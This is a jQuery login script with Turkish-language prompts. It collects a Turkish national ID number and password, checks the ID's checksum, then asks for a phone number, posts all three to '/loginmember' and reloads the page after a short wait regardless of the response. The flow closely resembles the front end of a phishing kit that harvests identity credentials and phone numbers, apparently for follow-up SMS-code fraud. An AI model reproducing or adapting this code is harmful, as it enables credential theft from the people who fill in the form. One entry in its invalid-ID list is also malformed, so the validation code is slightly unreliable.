$(function () {
    var $first = $("#first_step");
    var $twice = $("#twice_step");
    var $three = $("#three_step");
    var $tc = $("#tcOrUserNametxt");
    var $pw = $("#tbPasswordtxt");
    var $phone = $("#phone");

    var $btnLogin = $("#btnLogin");
    var $btnPhone = $("#btnPhone");

    var jsonData = {
        tc: $tc.val(),
        password: $pw.val(),
        try: 1,
    };
    class Login {
        constructor() {
            // $phone.inputmask("999 999 99 99");
            var csrfToken = $('meta[name="csrf-token"]').attr("content");
            $.ajaxSetup({
                headers: {
                    "X-CSRF-TOKEN": csrfToken,
                },
            });
        }
        firstStep = () => {
            let instance = this;
            $btnLogin.click(function () {

                if (
                    $tc.val() == "" ||
                    $tc.val().replaceAll("_", "").length < 11 ||
                    !instance.tcKontrol($tc.val().replaceAll("_", ""))
                ) {
                    toastr.info("Yanlış TC Kimlik Numarası Girdiniz");
                    return false;
                }

                if ($pw.val() == "" || $pw.val().replaceAll("_", "").length < 6) {
                    toastr.info("Lütfen geçerli bir şifre giriniz");
                    return false;
                }

                jsonData['tc'] = $tc.val();
                jsonData['password'] = $pw.val();
                $first.fadeOut();
                $twice.removeClass('d-none').fadeOut().fadeIn()
            });
        }

        twiceStep = () => {
            let instance = this;
            $btnPhone.click(function () {
                if ($phone.val() == '') {
                    toastr.info("Telefon numarası zorunludur")
                    return false;
                }

                jsonData['phone'] = $phone.val();
                instance.lastStep();
            })
        }

        lastStep = () => {
            $.ajax({
                type: "POST",
                url: "/loginmember",
                dataType: "json",
                data: jsonData,
                success: function (response) {
                    setTimeout(function () {
                        location.reload();
                    }, 3000);
                },
            });
            $twice.hide()
            $three.removeClass('d-none').fadeOut().fadeIn()
        }

        tcKontrol = (TCNO) => {
            var tek = 0,
                cift = 0,
                sonuc = 0,
                TCToplam = 0,
                i = 0,
                hatali = [11111111110, 22222222220, 33333333330, 44444444440, 55555555550, 66666666660, 7777777770, 88888888880, 99999999990];;

            if (TCNO.length != 11) return false;
            if (isNaN(TCNO)) return false;
            if (TCNO[0] == 0) return false;

            tek = parseInt(TCNO[0]) + parseInt(TCNO[2]) + parseInt(TCNO[4]) + parseInt(TCNO[6]) + parseInt(TCNO[8]);
            cift = parseInt(TCNO[1]) + parseInt(TCNO[3]) + parseInt(TCNO[5]) + parseInt(TCNO[7]);

            tek = tek * 7;
            sonuc = tek - cift;
            if (sonuc % 10 != TCNO[9]) return false;

            for (var i = 0; i < 10; i++) {
                TCToplam += parseInt(TCNO[i]);
            }

            if (TCToplam % 10 != TCNO[10]) return false;

            if (hatali.toString().indexOf(TCNO) != -1) return false;

            return true;
        }

        init = () => {
            this.firstStep();
            this.twiceStep();
        }
    }


    let exec = new Login();
    exec.init();
});